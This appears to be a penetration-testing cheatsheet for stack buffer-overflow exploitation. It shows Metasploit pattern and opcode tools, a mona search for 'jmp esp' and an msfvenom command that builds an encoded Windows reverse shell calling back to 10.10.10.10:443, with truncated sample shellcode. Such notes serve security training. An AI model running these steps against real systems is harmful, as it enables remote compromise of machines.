# Cheatsheet - Buffer Overflows (BOF)
## Generating a String of Non-Repeating Characters
```bash
msf-pattern_create -l 1000 # print a string of 1000 non-repeating characters
msf-pattern_create -l 1000 -q 12345678 # get the number of bytes required to get to this offset
```

## Finding Opcodes
```bash
msf-nasm_shell # invoke msf-nasm_shell
jmp esp # give it an assembly instruction

# output
00000000 FFE4 jmp esp # the second column is the opcode that corresponds with your instruction
```

## Searching a Binary or DLL for Specific Assembly Instructions
Using Immunity Debugger
```bash
!mona find -s “\xff\xe4” -m “foo.dll” # search for “jmp esp” instruction
```

## Generating Shellcode
```bash
msfvenom -l payloads # list all payload options

# -p = payload: reverse shell
# EXITFUNC=thread = exit the thread (not process); avoids app crash
# -e = encode: to match target environment
# -b = bad characters: ASCII stuff (null, LF, CR, %, &, +, =)
# -f = (output) format: C 
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread \
-e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c 

# output 
unsigned char buf[] =
"\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"

# using the above shellcode in a Python script
shell = (
    "\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
    "\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"
)
```
